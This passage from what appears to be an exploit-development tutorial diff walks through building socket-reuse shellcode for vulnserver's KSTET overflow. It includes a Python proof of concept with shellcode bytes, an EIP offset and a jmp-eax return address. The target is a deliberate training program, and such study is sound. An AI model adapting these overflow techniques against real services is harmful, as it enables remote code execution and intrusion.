@@ -624,3 +624,76 @@ push ebx
 
 File Descriptor, We Meet Again.
 ---
+It is time to push our file descriptor onto the stack. Remember- our file descriptor is located in EDI. However, we cannot just execute a `push edi` instruction. Right now, EDI contains an actual value of __`00C0F9FC`__. Executing a `push edi` would literally put the value __`00C0F9FC`__ onto the stack.
+
+We would like the value of __`0x00000088`__ to be on the stack. Recall that the value of __`0x00000088`__ is pointed to by EDI! That means if we can push the data that EDI references (or points to), we could get the file descriptor onto the stack.
+
+We will need to `push dword ptr ds:[edi]`
+
+This will push the double word (__DWORD__, we are using a 32 bit register) pointer referenced in the data segment (ds) of EDI.
+
+Shellcode instructions:
+
+```console
+FF37             PUSH DWORD PTR DS:[EDI]
+```
+
+Updated POC:
+
+```python
+import os
+import sys
+import socket
+
+# Vulnerable command
+command = "KSTET "
+
+# 2000 bytes to crash vulnserver.exe
+# Software breakpoint to pause execution
+crash = "\xCC" * 2
+
+# Creating file descriptor = 0x00000090
+crash += "\x31\xc9"			# xor ecx, ecx
+crash += "\x80\xc1\x88"			# add cl, 0x88
+crash += "\x51"				# push ecx
+crash += "\x89\xe7"			# mov edi, esp
+
+# Move ESP out of the way
+crash += "\x83\xec\x50"			# sub esp, 0x50
+
+# Flags = 0x00000000
+crash += "\x31\xd2"
+crash += "\x52"				# push edx
+
+# BufSize = 0x00000200
+crash += "\x80\xc6\x02"			# add dh, 0x02
+crash += "\x52"				# push edx
+
+# Buffer = 0x00C0F9F0
+crash += "\x54"				# push esp
+crash += "\x5b"				# pop ebx
+crash += "\x83\xc3\x4c"			# add ebx, 0x4c
+crash += "\x53"				# push ebx
+
+# Push file descriptor onto the stack:
+crash += "\xff\x37"			# push dword ptr ds:[edi]
+
+# 70 byte offset to EIP
+crash += "\x41" * (70-len(crash))
+crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\x43" * (2000-len(crash))
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.143", 9999))
+
+s.send(command+crash)
+```
+
+Execution in Immunity:
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/025.png" alt="">
+
+All of our parameters are now on the stack!
+
+Calling WS_32.recv()
+---
